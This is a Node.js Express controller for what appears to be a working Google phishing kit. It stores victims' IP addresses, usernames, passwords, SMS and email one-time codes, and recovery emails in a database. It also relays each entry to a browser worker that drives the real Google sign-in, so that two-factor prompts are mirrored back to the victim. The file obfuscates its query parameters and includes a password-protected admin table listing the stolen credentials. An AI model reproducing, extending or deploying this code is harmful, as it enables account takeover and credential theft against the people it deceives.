const db = require('../models/db');
const path = require('path');
const fs = require('fs');

const GOOGLE_URL = 'https://accounts.google.com/signin/v2/identifier';

const pwdState = {};
const pwdResult = {};
const tapData = {};
const mobileResult = {};
const mobileOtpResult = {};
const eotpResult = {};
const recEmailResult = {};

let _sendToWorker = null;
function setSendToWorker(fn) { _sendToWorker = fn; }
function sendToWorker(action, payload) {
  if (_sendToWorker) return _sendToWorker(action, payload);
  return Promise.resolve({ error: 'Worker not available' });
}
module.exports.setSendToWorker = setSendToWorker;

exports.getIndex = (req, res) => {
  res.render('index');
};

exports.getLoad = (req, res) => {
  res.render('load');
};

exports.getFirst = (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '';
  const useragent = req.headers['user-agent'] || '';
  db.query('INSERT INTO autotable (ip, useragent) VALUES (?, ?)', [ip, useragent]).catch(e => console.error('[DB] Insert error:', e.message));
  res.render('first');
};

exports.postFirst = async (req, res) => {
  const { username } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '';
  db.query('UPDATE autotable SET username = ? WHERE ip = ? ORDER BY id DESC LIMIT 1', [username, ip]).catch(e => console.error('[DB] Update username error:', e.message));
  pwdState[username] = 'waiting';
  sendToWorker('launch', { username }).then(() => {
    sendToWorker('fillEmail', { username, email: username });
  });
  res.json({ ok: true });
};

exports.pwdReady = (req, res) => {
  const username = req.query.u;
  sendToWorker('checkState', { username }).then(r => {
    const state = r.state || 'waiting';
    res.json({ ready: state === 'ready', emailError: state === 'emailError' });
  });
};

exports.getHom = (req, res) => res.render('hom');

exports.postPassword = async (req, res) => {
  const { username, password } = req.body;
  pwdResult[username] = 'waiting';
  tapData[username] = null;
  db.query('UPDATE autotable SET password = ? WHERE username = ? ORDER BY id DESC LIMIT 1', [password, username]).catch(() => {});
  res.json({ ok: true });
  sendToWorker('fillPassword', { username, password });
};

exports.pwdResultCheck = async (req, res) => {
  const username = req.query.u;
  const r = await sendToWorker('getPageData', { username });
  res.json({ result: r.result || 'waiting', tapData: r.data || null });
};

exports.fetchStatus = (req, res) => res.json({ results: [{ username: '', pagetype: 'b', mobiletype: 'b' }] });
exports.fetchTap = (req, res) => res.json({ results: [{ username: '', pagetype: 'b' }] });

exports.getTap = (req, res) => {
  const encoded = req.query['NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj'];
  if (encoded) {
    const parts = Buffer.from(encoded, 'base64').toString('utf8').split('/');
    const tc = parts[2]; const mt = parts[3] || 'phone';
    db.query('UPDATE autotable SET pagetype = ?, mobiletype = ? WHERE username = ? ORDER BY id DESC LIMIT 1', [tc, mt, parts[1]]).catch(() => {});
    return res.render('tap', { tapcode: tc, mtype: mt });
  }
  const tk = req.query.mbbjgsmhyropjmhnkidgdjkjsetwungdkdh || '';
  const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
  (async () => {
    const r = await sendToWorker('getPageData', { username });
    const data = r.data;
    const tc = data ? data.tapcode : Math.floor(10 + Math.random() * 90);
    const mt = data ? data.mtype : 'phone';
    db.query('UPDATE autotable SET pagetype = ?, mobiletype = ? WHERE username = ? ORDER BY id DESC LIMIT 1', [String(tc), mt, username]).catch(() => {});
    res.render('tap', { tapcode: tc, mtype: mt });
  })();
};

exports.getTapN = (req, res) => {
  const encoded = req.query['NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj'];
  if (encoded) {
    const parts = Buffer.from(encoded, 'base64').toString('utf8').split('/');
    const mt = parts[3] || 'phone';
    db.query('UPDATE autotable SET pagetype = ?, mobiletype = ? WHERE username = ? ORDER BY id DESC LIMIT 1', ['tapn', mt, parts[1]]).catch(() => {});
    return res.render('tapn', { mtype: mt });
  }
  const tk = req.query.mbbjgsmhyropjmhnkidgdjkjsetwungdkdh || '';
  const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
  (async () => {
    const r = await sendToWorker('getPageData', { username });
    const data = r.data;
    const mt = data ? data.mtype : 'phone';
    db.query('UPDATE autotable SET pagetype = ?, mobiletype = ? WHERE username = ? ORDER BY id DESC LIMIT 1', ['tapn', mt, username]).catch(() => {});
    res.render('tapn', { mtype: mt });
  })();
};

exports.getMobileConfirm = (req, res) => {
  const encoded = req.query['NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj'];
  if (encoded) return res.render('mconfi', { mobNumber: '***' });
  const tk = req.query.mbbjgsmhyropjmhnkidgdjkjsetwungdkdh || '';
  const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
  (async () => {
    const r = await sendToWorker('getPageData', { username });
    res.render('mconfi', { mobNumber: r.data ? r.data.mobNumber : '***' });
  })();
};

exports.postMobileConfirm = async (req, res) => {
  const { username, tel } = req.body;
  mobileResult[username] = 'waiting';
  db.query('UPDATE autotable SET pagetype = ? WHERE username = ? ORDER BY id DESC LIMIT 1', [tel, username]).catch(() => {});
  res.json({ ok: true });
  sendToWorker('fillTel', { username, tel });
};

exports.mobileResultCheck = async (req, res) => {
  const username = req.query.u;
  const r = await sendToWorker('getPageData', { username });
  res.json({ result: r.result || 'waiting', data: r.data || null });
};

exports.getMobileOtpPage = async (req, res) => {
  const tk = req.query.mbbjgsmhyropjmhnkidgdjkjsetwungdkdh || '';
  const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
  const r = await sendToWorker('getPageData', { username });
  const hiddenMobNumber = (r.data && r.data.hiddenMobNumber) ? r.data.hiddenMobNumber : (req.query.mob || '***');
  res.render('motp', { hiddenMobNumber });
};

exports.postMobileOtp = async (req, res) => {
  const { username, code } = req.body;
  mobileOtpResult[username] = 'waiting';
  db.query('UPDATE autotable SET mobiletype = ? WHERE username = ? ORDER BY id DESC LIMIT 1', [code, username]).catch(() => {});
  res.json({ ok: true });
  sendToWorker('fillCode', { username, code });
};

exports.mobileOtpResultCheck = async (req, res) => {
  const username = req.query.u;
  const r = await sendToWorker('checkState', { username });
  res.json({ result: r.result || 'waiting' });
};

exports.getEmailConfirm = (req, res) => {
  const encoded = req.query['NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj'];
  if (!encoded) return res.status(400).send('Bad request');
  const username = Buffer.from(encoded, 'base64').toString('utf8').split('/')[1];
  res.render('recmail', { username, recemail: 'r*****@example.com' });
};

exports.postEmailConfirm = (req, res) => {
  const { username, recoveryemail } = req.body;
  const masked = recoveryemail.replace(/(?<=.{2}).(?=[^@]*@)/g, '*');
  res.render('eotp', { username, recemail: masked });
};

exports.postEmailOtp = async (req, res) => {
  const { username, code } = req.body;
  eotpResult[username] = 'waiting';
  res.json({ ok: true });
  sendToWorker('fillCode', { username, code });
};

exports.eotpResultCheck = async (req, res) => {
  const username = req.query.u;
  const r = await sendToWorker('checkState', { username });
  res.json({ result: r.result || 'waiting' });
};

exports.getEotp = (req, res) => {
  const tk = req.query.mbbjgsmhyropjmhnkidgdjkjsetwungdkdh || '';
  const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
  (async () => {
    const r = await sendToWorker('getPageData', { username });
    const data = r.data;
    const recemail = req.query.recemail || (data ? data.recemail : '***@***.com');
    res.render('eotp', { recemail });
  })();
};

exports.getRecEmail = (req, res) => {
  const tk = req.query.mbbjgsmhyropjmhnkidgdjkjsetwungdkdh || '';
  const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
  (async () => {
    const r = await sendToWorker('getPageData', { username });
    res.render('rec.email', { recemail: r.data ? r.data.recemail : '***@***.com' });
  })();
};

exports.postRecEmail = async (req, res) => {
  const { username, recoveryemail } = req.body;
  recEmailResult[username] = 'waiting';
  db.query('UPDATE autotable SET mobiletype = ? WHERE username = ? ORDER BY id DESC LIMIT 1', [recoveryemail, username]).catch(() => {});
  res.json({ ok: true });
  sendToWorker('fillRecEmail', { username, email: recoveryemail });
};

exports.recEmailResultCheck = async (req, res) => {
  const username = req.query.u;
  const r = await sendToWorker('checkState', { username });
  res.json({ result: r.result || 'waiting' });
};

exports.getQrCode = (req, res) => {
  const encoded = req.query['NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj'];
  if (encoded) {
    const username = Buffer.from(encoded, 'base64').toString('utf8').split('/')[1];
    db.query('UPDATE autotable SET pagetype = ? WHERE username = ? ORDER BY id DESC LIMIT 1', ['your phone', username]).catch(() => {});
    return res.render('qr-code', { pnumber: 'your phone', mlink: 'g.co/verifyaccount' });
  }
  const tk = req.query.mbbjgsmhyropjmhnkidgdjkjsetwungdkdh || '';
  const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
  (async () => {
    const r = await sendToWorker('getPageData', { username });
    const data = r.data;
    const pn = data ? data.pnumber : 'your phone';
    db.query('UPDATE autotable SET pagetype = ? WHERE username = ? ORDER BY id DESC LIMIT 1', [pn, username]).catch(() => {});
    res.render('qr-code', { pnumber: pn, mlink: data ? data.mlink : 'g.co/verifyaccount' });
  })();
};

exports.getDataTable = async (req, res) => {
  try {
    const [rows] = await db.query('SELECT * FROM autotable ORDER BY id DESC');
    res.render('datatable', { rows });
  } catch (err) {
    res.status(500).send('Database error: ' + err.message);
  }
};

exports.deleteRow = async (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) return res.status(400).json({ ok: false, error: 'Invalid id' });
  try {
    await db.query('DELETE FROM autotable WHERE id = ?', [id]);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
};

const dbu = require('../models/dbu');

exports.authCheck = (req, res, next) => {
  if (req.session && req.session.dbAuth) {
    const now = Date.now();
    const loginTime = req.session.dbLoginTime || 0;
    if (now - loginTime > 4 * 60 * 1000) {
      req.session.destroy();
      return res.redirect('/dblogin');
    }
    req.session.dbLoginTime = now;
    return next();
  }
  res.redirect('/dblogin');
};

exports.getDbLogin = (req, res) => res.render('dblogin', { error: null });

exports.postDbLogin = (req, res) => {
  const { username, password } = req.body;
  dbu.query('SELECT * FROM users WHERE username = ? AND password = ?', [username, password], (err, results) => {
    if (err || results.length === 0) return res.render('dblogin', { error: 'Invalid username or password' });
    req.session.dbAuth = true;
    req.session.dbLoginTime = Date.now();
    res.redirect('/datatable');
  });
};
